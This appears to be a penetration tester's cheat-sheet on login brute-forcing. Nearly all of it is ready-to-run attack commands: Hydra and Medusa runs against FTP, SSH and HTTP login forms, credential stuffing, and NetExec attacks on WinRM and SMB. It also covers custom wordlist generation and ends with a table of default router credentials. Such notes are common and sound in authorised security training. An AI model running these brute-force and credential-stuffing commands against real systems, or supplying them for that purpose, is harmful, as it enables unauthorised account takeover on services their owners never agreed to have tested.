#passwords #hydra #medusa #brute-force

# Login Brute-Forcing

Related: [password-attacks](password-attacks.md) · [hashcat](hashcat.md) · [common-services](../Network/common-services.md) · [fuzzing](../Web/fuzzing.md)

## Hydra
```bash
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100
```
Brute-force FTP (also `ssh://`, `rdp`, `pop3`, etc.).

```bash
hydra -L user.list -P password.list ssh://192.168.1.100
```
Brute-force with user + password lists.

```bash
hydra -C creds.list ssh://192.168.1.100
```
Credential stuffing with a `user:pass` list.

```bash
hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
Brute-force an HTTP POST login form (`F=` = failure string).

## Medusa
```bash
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5
```
Parallel brute-force (5 threads).

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f
```
Brute-force SSH, stop after first valid login (`-f`).

## NetExec (remote)
```bash
nxc winrm <ip> -u user.list -p password.list
```
Brute-force WinRM. See [password-attacks](password-attacks.md).

```bash
nxc smb <ip> -u "user" -p "password" --shares
```
Validate creds and list SMB shares.

## Custom Wordlists
```bash
username-anarchy Jane Smith
```
Generate candidate usernames from a name (`-i names.txt`, `-@ example.com`).

```bash
cupp -i
```
Interactive personalized wordlist (`-l` to fetch rockyou.txt).

## Password Policy Filtering (grep)
```bash
grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]'
```
Keep words ≥8 chars that contain an uppercase letter.

```bash
grep -v -i 'password' wordlist.txt
```
Exclude words containing a banned pattern.

```bash
grep -v -f dictionary.txt wordlist.txt
```
Exclude dictionary words.

## Default Credentials
```
Linksys admin:admin   Netgear admin:password   TP-Link admin:admin
Cisco cisco:cisco     Ubiquiti UniFi ubnt:ubnt
```
Common device defaults (check CIRT.net / SecLists first).
